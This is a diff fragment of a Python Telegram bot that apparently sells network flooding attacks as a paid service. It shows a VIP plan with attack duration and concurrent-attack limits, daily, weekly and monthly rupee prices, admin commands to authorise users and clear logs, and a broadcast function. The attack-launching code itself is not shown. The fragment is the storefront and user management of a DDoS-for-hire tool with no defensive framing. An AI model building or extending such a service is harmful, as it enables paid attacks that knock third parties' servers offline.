+
+
+Vip :
+
+Attack Time : 180 (S)
+
+After Attack Limit : No Limit
+
+Concurrents Attack : 3
+
+
+
+Price Lists :
+
+Day : 300 Rs
+
+Week : 1000 Rs
+
+Month : 2000 Rs
+
+'''
+
+    bot.reply_to(message, response)
+
+
+
+@bot.message_handler(commands=['admincmd'])
+
+def welcome_plan(message):
+
+    user_name = message.from_user.first_name
+
+    response = f'''{user_name}, Admin Commands Are Here!!:
+
+
+
+/add <userId> : Add a User.
+
+/remove <userid> Remove a User.
+
+/allusers : Authorised Users Lists.
+
+/logs : All Users Logs.
+
+/broadcast : Broadcast a Message.
+
+/clearlogs : Clear The Logs File.
+
+'''
+
+    bot.reply_to(message, response)
+
+
+
+
+
+@bot.message_handler(commands=['broadcast'])
+
+def broadcast_message(message):
+
+    user_id = str(message.chat.id)
+
+    if user_id in admin_id:
+
+        command = message.text.split(maxsplit=1)
+
+        if len(command) > 1:
+
+            message_to_broadcast = "Message To All Users By @ReporterAlpha:\n\n" + command[1]
+
+            with open(USER_FILE, "r") as file:
+
+                user_ids = file.read().splitlines()
+
+                for user_id in user_ids:
+
+                    try:
+
+                        bot.send_message(user_id, message_to_broadcast)
+
+                    except Exception as e:
+
+                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+
+            response = "Broadcast Message Sent Successfully To All Users."
+
+        else:
+
+            response = "Please Provide A Message To Broadcast."
+
+    else:
+
+        response = "Only Admin Can Run This Command."
+
+
+
+    bot.reply_to(message, response)
+
+bot.polling()
+
+ #ReporterAlpha
